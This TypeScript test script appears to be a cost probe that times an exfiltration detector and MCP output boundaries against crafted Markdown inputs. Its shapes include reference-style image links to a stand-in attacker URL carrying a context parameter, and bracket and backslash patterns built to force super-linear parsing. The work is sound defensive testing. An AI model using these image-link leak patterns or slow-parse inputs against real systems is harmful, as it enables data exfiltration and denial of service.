// T83 — the cost obligation that comes with closing T82#F-001.
//
// Three questions, three modes:
//   ladder   — does any shape grow faster than its size? (exponent per shape)
//   sweep    — at CONSTANT total bytes, does any dial an attacker can choose
//              move the cost by more than a bounded factor?
//   boundary — do the four public boundaries stay under a second up to 1 MB?
//
// The shapes are the ones this repair's mechanism is exposed to, which the nine
// prior rounds' shapes are not: they all carried a `]`, so none of them ever
// reached the definition scan's own cost. Every shape here either omits `]`
// entirely, or puts a BACKSLASH-ESCAPED one where the terminator has to be.
//
// Read-only, offline, synthetic and reserved hosts only.
// Usage: bun T83-cost.ts [ladder|sweep|boundary] [outfile]
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";

const U = "https://attacker.invalid/p?ctx=CTX";
const OK = "https://ok.example.org/x";

// Every shape takes a size dial `n` so a ladder can be built from it.
const shapes: Record<string, (n: number) => string> = {
  // The definition scan's own worst case: a bracket opened on every line and
  // never closed, so nothing can terminate a label. No `]` anywhere.
  lineStartOpensNoClose: (n) => "[aaaaaaaaa\n".repeat(n),
  lineStartOpensIndented: (n) => "  [aaaaaaaaa\n".repeat(n),
  // The same with a backslash on every line, which is what a second,
  // escape-aware PATTERN would have been quadratic on.
  lineStartOpensBackslash: (n) => "[aaaa\\aaaa\n".repeat(n),
  // An escaped `]` on every line and no terminator anywhere after it.
  lineStartOpensEscapedClose: (n) => "[a\\]aaaaa\n".repeat(n),
  // `\r` is a line terminator for `^` under /m, so the line walk has to see it.
  lineStartOpensCarriageReturn: (n) => "[aaaaaaaaa\r".repeat(n),
  // Many line-start opens sharing ONE escaped `]` and one real terminator: the
  // shape the escape-aware reading would be quadratic on if it did not refuse a
  // label carrying an unescaped `[`.
  nestedOpensOneEscapedClose: (n) => "[\n".repeat(n) + `a\\]]: ${U}\n`,
  // A key made of nothing but escaped backslashes.
  backslashRunKey: (n) => `[${"\\\\".repeat(n)}x]: ${U}\n` + "![".repeat(n) + "]",
  // Escaped definitions, dense, with a bracket run after them.
  escapedDefsThenBangRun: (n) => `[a\\]b]: ${U}\n`.repeat(n) + "![".repeat(n) + "]",
  // Every escaped definition actually resolved by an image use — the path the
  // repair opens, driven as hard as the input allows.
  escapedDefsAllResolving: (n) =>
    Array.from({ length: n }, (_, i) => `[k${i}\\]z]: ${U}\n`).join("") +
    Array.from({ length: n }, (_, i) => `![k${i}\\]z]`).join(""),
  // One escaped definition inside ordinary prose.
  prose_oneEscapedDef: (n) =>
    `[see the note\\] here]: ${OK}\n\n` + "The quick brown fox. ".repeat(n),
  // T81's worst shape, carried forward unchanged as the control.
  balancedNest_withLongDef: (n) =>
    `[${"a".repeat(n)}]: ${OK}\n` + "[".repeat(n) + "]".repeat(n),
};

function best(build: () => string, runs = 3): { bytes: number; ms: number } {
  const text = build();
  let ms = Infinity;
  for (let run = 0; run < runs; run += 1) {
    const started = performance.now();
    detectExfil(text, []);
    const elapsed = performance.now() - started;
    if (elapsed < ms) ms = elapsed;
  }
  return { bytes: text.length, ms: Number(ms.toFixed(1)) };
}

const mode = process.argv[2] ?? "ladder";

if (mode === "ladder") {
  const steps = [4000, 8000, 16000, 32000];
  const rows = Object.entries(shapes).map(([id, build]) => {
    const points = steps.map((n) => {
      const { bytes, ms } = best(() => build(n));
      return { n, bytes, ms };
    });
    const first = points[0] as { bytes: number; ms: number };
    const last = points[points.length - 1] as { bytes: number; ms: number };
    const exponent =
      Math.log(Math.max(last.ms, 0.01) / Math.max(first.ms, 0.01)) /
      Math.log(last.bytes / first.bytes);
    return { id, points, exponent: Number(exponent.toFixed(2)) };
  });
  console.log(
    JSON.stringify(
      {
        probe: "T83-cost/ladder",
        rows,
        overOneSecond: rows
          .filter((r) => r.points.some((p) => p.ms >= 1000))
          .map((r) => r.id),
        superLinear: rows.filter((r) => r.exponent >= 1.5).map((r) => r.id),
      },
      null,
      2,
    ),
  );
} else if (mode === "sweep") {
  // Total bytes held CONSTANT while the quantities a payload chooses move. A
  // dial an attacker can inflate shows up as a climbing column.
  const TOTAL = 262144;
  const padTo = (body: string) =>
    body.length >= TOTAL ? body.slice(0, TOTAL) : body + "z".repeat(TOTAL - body.length);
  const dials: Array<{ dial: string; points: Array<[number, number]> }> = [];

  const escapedDefCount: Array<[number, number]> = [];
  for (const count of [1, 10, 100, 1000, 5000]) {
    const body = `[a\\]b]: ${U}\n`.repeat(count);
    escapedDefCount.push([count, best(() => padTo(body)).ms]);
  }
  dials.push({ dial: "escapedDefinitionCount", points: escapedDefCount });

  const escapedLabelLength: Array<[number, number]> = [];
  for (const length of [1, 64, 1000, 20000, 100000]) {
    const body = `[${"a".repeat(length)}\\]b]: ${U}\n![${"a".repeat(length)}]`;
    escapedLabelLength.push([length, best(() => padTo(body)).ms]);
  }
  dials.push({ dial: "escapedLabelLength", points: escapedLabelLength });

  const backslashes: Array<[number, number]> = [];
  for (const run of [0, 1, 100, 10000, 60000]) {
    const body = `[x${"\\\\".repeat(run)}\\]y]: ${U}\n![x${"\\\\".repeat(run)}]`;
    backslashes.push([run, best(() => padTo(body)).ms]);
  }
  dials.push({ dial: "backslashRunInLabel", points: backslashes });

  const lineStartOpens: Array<[number, number]> = [];
  for (const count of [1, 100, 5000, 20000]) {
    const body = "[\n".repeat(count) + `a\\]]: ${U}\n`;
    lineStartOpens.push([count, best(() => padTo(body)).ms]);
  }
  dials.push({ dial: "lineStartOpensSharingOneClose", points: lineStartOpens });

  console.log(
    JSON.stringify(
      {
        probe: "T83-cost/sweep",
        totalBytes: TOTAL,
        rows: dials,
        summary: dials.map((d) => {
          const values = d.points.map(([, ms]) => ms);
          const min = Math.min(...values);
          const max = Math.max(...values);
          return { dial: d.dial, min, max, spread: Number((max - min).toFixed(1)) };
        }),
      },
      null,
      2,
    ),
  );
} else {
  // The four public boundaries, one shape per process is not possible here, so
  // best-of-three per cell and the worst boundary reported per row.
  const pass: GuardResult = {
    allowed: true,
    decision: { gate: "pass", action: "allow", findings: [] },
  };
  const cwd = process.cwd();
  const picked = [
    "lineStartOpensNoClose",
    "lineStartOpensEscapedClose",
    "escapedDefsAllResolving",
    "nestedOpensOneEscapedClose",
  ];
  const rows: Array<Record<string, unknown>> = [];
  for (const id of picked) {
    const build = shapes[id] as (n: number) => string;
    for (const n of [8000, 16000, 32000, 64000]) {
      const text = build(n);
      const serialized = JSON.stringify({ note: text });
      const ctx: McpContext = {
        cwd,
        config: mergeMcpConfig({ redactToolOutput: false }),
        discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
        transport: "in-process",
        tools: [
          {
            name: "p.shape",
            module: "standard" as const,
            description: id,
            inputSchema: { type: "object" },
            mutating: false,
            invoke: async () => ({ note: text }),
          },
        ],
      };
      const timed: Record<string, number> = {};
      const measure = async (name: string, run: () => unknown | Promise<unknown>) => {
        let ms = Infinity;
        for (let i = 0; i < 3; i += 1) {
          const started = performance.now();
          await run();
          const elapsed = performance.now() - started;
          if (elapsed < ms) ms = elapsed;
        }
        timed[name] = Number(ms.toFixed(1));
      };
      await measure("dispatchCallTool", () => dispatchCallTool(ctx, "p.shape", {}));
      await measure("prepareOutputForPersistence", () =>
        prepareOutputForPersistence(pass, serialized),
      );
      await measure("validateOutputForTransport", () =>
        validateOutputForTransport({ value: { note: text }, format: "json" }),
      );
      await measure("redactToolOutput", () => redactToolOutput(cwd, serialized));
      rows.push({ id, bytes: text.length, ...timed, worst: Math.max(...Object.values(timed)) });
    }
  }
  console.log(
    JSON.stringify(
      {
        probe: "T83-cost/boundary",
        rows,
        boundariesOverOneSecond: rows.filter((r) => (r.worst as number) >= 1000).map(
          (r) => `${r.id}@${r.bytes}`,
        ),
      },
      null,
      2,
    ),
  );
}
